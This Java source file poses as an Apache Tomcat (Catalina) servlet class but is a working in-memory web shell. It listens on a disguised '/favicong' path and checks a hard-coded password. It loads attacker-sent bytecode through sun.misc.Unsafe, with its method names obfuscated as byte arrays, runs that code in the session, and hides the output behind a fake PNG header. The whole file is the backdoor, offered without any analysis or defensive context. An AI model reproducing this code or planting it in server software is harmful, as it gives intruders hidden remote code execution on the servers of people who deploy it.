package org.apache.catalina.servlets.sl;

import org.apache.catalina.servlets.redefine.MyRequest;
import org.apache.catalina.servlets.redefine.MyResponse;
import org.apache.catalina.servlets.redefine.MyServletOutputStream;
import org.apache.catalina.servlets.redefine.MySession;

public class GSL {
    private static final String pathPattern= "/favicong";
    private static final String px = "1a539a061fa9458e2b869c3cf8be6d99";

    public static Class loader(byte[] bytes) throws Exception {
        java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
        field.setAccessible(true);
        Object unsafe = field.get(null);
        java.lang.reflect.Method m = sun.misc.Unsafe.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,65,110,111,110,121,109,111,117,115,67,108,97,115,115}), new Class[]{Class.class, byte[].class, Object[].class});
        m.setAccessible(true);
        Class clazz = (Class) m.invoke(unsafe, new Object[]{java.io.File.class, bytes, null});
        return clazz;
    }

    private static byte[] Decrypt(byte[] data) {
        if (data.length == 0) {
            return data;
        } else {
            try {
                java.io.ByteArrayInputStream t = new java.io.ByteArrayInputStream(data);
                java.util.zip.GZIPInputStream i = new java.util.zip.GZIPInputStream(t, data.length);
                return r(i);
            } catch (Exception ignored) {

            }
        }
        return data;
    }

    private static byte[] Encrypt(byte[] data) {
        try {
            java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
            java.util.zip.GZIPOutputStream g = new java.util.zip.GZIPOutputStream(o);
            g.write(data);
            g.close();
            return o.toByteArray();
        } catch (Exception ignored) {

        }return data;
    }
    private static byte[] r(java.io.InputStream i) {
        byte[] temp = new byte[1024];
        java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
        int n;
        try {
            while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
            }} catch (Exception ignored) {
        }
        return b.toByteArray();
    }


    public static void doService(Object obj, String url,String method, java.io.InputStream in){
        if (url.matches(pathPattern)){
            if (method.equals("POST")){
                java.util.Map objMap = (java.util.Map)obj;
                Object request = objMap.get("request");
                Object response = objMap.get("response");
                try {
                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                    byte[] ds = r(in);
                    byte[] dr = new byte[ds.length - 208];
                    System.arraycopy(ds, 149, dr, 0, dr.length);
                    byte[] x = new byte[dr.length - 64];
                    System.arraycopy(dr, 64, x, 0, x.length);
                    dr = Decrypt(x);
                    byte[] p = new byte[32];
                    System.arraycopy(dr, dr.length - 32, p, 0, p.length);
                    byte[] data = new byte[dr.length - 32];
                    System.arraycopy(dr, 0, data, 0, data.length);
                    if (java.util.Arrays.equals(p, px.getBytes())) {
                        if (MySession.getAttribute(MyRequest.getSession(request), "ve") == null) {
                            Class zz = loader(data);
                            MySession.setAttribute(MyRequest.getSession(request), "ve", zz);
                        } else {
                            MySession.setAttribute(MyRequest.getSession(request), "p" + new String(new byte[]{97, 114, 97, 109, 101, 116, 101, 114}) + "s", data);
                            Object f = ((Class) MySession.getAttribute(MyRequest.getSession(request), "ve")).newInstance();
                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                            f.equals(arrOut);
                            f.equals(data);
                            f.equals(request);
                            f.toString();
                            byte[] o = Encrypt(arrOut.toByteArray());
                            byte[] i = new byte[]{-119, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82, 0, 0, 1, -108, 0, 0, 0, -124, 8, 6, 0, 0, 0, -73, 100, -35};
                            byte[] ox = new byte[o.length + i.length];
                            System.arraycopy(i, 0, ox, 0, i.length);
                            System.arraycopy(o, 0, ox, i.length, o.length);
                            MyResponse.setHeader(response, "Content-Type", "application/octet-stream");
                            java.io.OutputStream so = (java.io.OutputStream) MyResponse.getOutputStream(response);
                            MyServletOutputStream.write(so, ox, 0, ox.length);
                            MyServletOutputStream.flush(so);
                            MyServletOutputStream.close(so);
                        }
                    }
                } catch (Exception ignored) {
                }
            }
        }
    }
}
